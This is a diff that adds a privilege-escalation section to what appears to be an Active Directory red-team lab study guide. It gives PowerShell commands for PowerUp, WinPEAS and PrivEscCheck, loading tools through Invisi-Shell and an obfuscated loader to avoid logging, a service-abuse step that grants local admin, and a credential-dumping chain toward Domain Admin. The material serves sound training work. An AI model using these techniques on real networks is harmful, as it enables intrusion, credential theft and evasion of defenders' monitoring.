@@ -379,6 +379,158 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe
 
 ## SECTION 4: PRIVILEGE ESCALATION - DETAILED PATHS
 
+### 4A: LOCAL PRIVILEGE ESCALATION TOOLS & TECHNIQUES
+
+#### PowerUp - Service Vulnerability Detection
+
+**Installation & Execution:**
+```powershell
+# Load PowerUp from Invisi-Shell (avoid logging)
+C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+PS C:\AD\Tools> . C:\AD\Tools\PowerUp.ps1
+PS C:\AD\Tools> Invoke-AllChecks
+```
+
+**Exploitable Vulnerabilities:**
+```powershell
+# Unquoted Service Paths
+# Output: ServiceName, Path, ModifiablePath, CanRestart
+# Exploitation: Write executable to modifiable path, restart service
+
+# Service Binary Permissions
+# Output: Writable service executable locations
+# Exploitation: Replace binary, restart, service runs as SYSTEM
+
+# Service Permissions  
+# Output: Services modifiable by current user
+# Exploitation: Use Invoke-ServiceAbuse to modify service binPath
+
+# DLL Hijacking
+# Output: DLLs in service directory without signatures
+# Exploitation: Plant malicious DLL, trigger service
+```
+
+**Example Exploitation:**
+```powershell
+# Identify vulnerable service (AbyssWebServer in lab)
+Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
+
+# Result: Current user added to local Administrators group
+# Service runs command: net localgroup Administrators dcorp\studentx /add
+
+# Logoff/login: User now has local admin privileges
+```
+
+---
+
+#### WinPEAS - Comprehensive Privilege Escalation Scanner
+
+**Execution:**
+```powershell
+# Using obfuscated version with Loader
+C:\AD\Tools> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
+
+# Output redirected to out.txt (approx 2000+ lines)
+```
+
+**Key Sections to Review:**
+```
+1. Services Information:
+   - Interesting Services (non-Microsoft)
+   - Modifiable Services (check if AllAccess)
+   - Service Executable Permissions
+   
+2. Processes Information:
+   - Running processes with high privileges
+   - Parent/child process relationships
+   
+3. Files & Folders Permissions:
+   - World-writable locations
+   - Modifiable system directories
+   
+4. Scheduled Tasks:
+   - Custom tasks with SYSTEM privileges
+   - Writable task binaries
+```
+
+**Analysis Focus:**
+- `AllAccess` permissions = Modifiable service
+- `WriteData/AddFile` on system paths = DLL hijacking
+- Services running as SYSTEM = High-value targets
+
+---
+
+#### PrivEscCheck - Quick Privilege Escalation Assessment
+
+**Execution:**
+```powershell
+PS C:\AD\Tools> . C:\AD\Tools\PrivEscCheck.ps1
+PS C:\AD\Tools> Invoke-PrivescCheck
+
+# Output format: Categorized findings with severity levels
+```
+
+**Finding Categories:**
+```
+TA0004 - Privilege Escalation:
+- Service permissions (vulnerable SCM permissions)
+- File permissions (writable system files/binaries)
+- Registry key permissions
+- Scheduled task vulnerabilities
+- DLL hijacking opportunities
+```
+
+**Key Indicator Statuses:**
+- `Status: Vulnerable - High` = Immediate exploitation possible
+- `UserCanStart` = Service can be restarted by current user
+- `AccessRights: AllAccess` = Full control over service
+
+---
+
+#### Finding Machines with Local Admin Access
+
+**Using Find-PSRemotingLocalAdminAccess:**
+```powershell
+# From current user context
+PS C:\AD\Tools> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+PS C:\AD\Tools> Find-PSRemotingLocalAdminAccess
+
+# Output: Machines where current user has admin privileges
+# Lab example: dcorp-adminsrv (studentx has admin access)
+```
+
+**Accessing Admin Machines:**
+```powershell
+# WinRM Method
+Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
+
+# CMD Method
+winrs -r:dcorp-adminsrv cmd
+
+# PowerShell Remoting
+Invoke-Command -ComputerName dcorp-adminsrv -ScriptBlock { whoami }
+```
+
+**Credential Extraction Chain:**
+```
+1. Get admin access to accessible machine (Find-PSRemotingLocalAdminAccess)
+2. Dump credentials from that machine (SafetyKatz, Mimikatz)
+3. Check if dumped credentials are DA or have interesting group memberships
+4. Use extracted credentials to access other machines
+5. Repeat until Domain Admin achieved
+```
+
+**Lab Example Flow:**
+```
+studentx → Local Admin on dcorp-adminsrv
+         → Extract creds: appadmin, srvadmin, websvc
+         → srvadmin is admin on dcorp-mgmt
+         → svcadmin (DA) has session on dcorp-mgmt
+         → Extract svcadmin → Domain Admin
+```
+
+---
+
 ### Path 1: Local Admin → Domain Admin via Reverse Shell
 
 #### Step 1: Initial Compromise → Local Admin
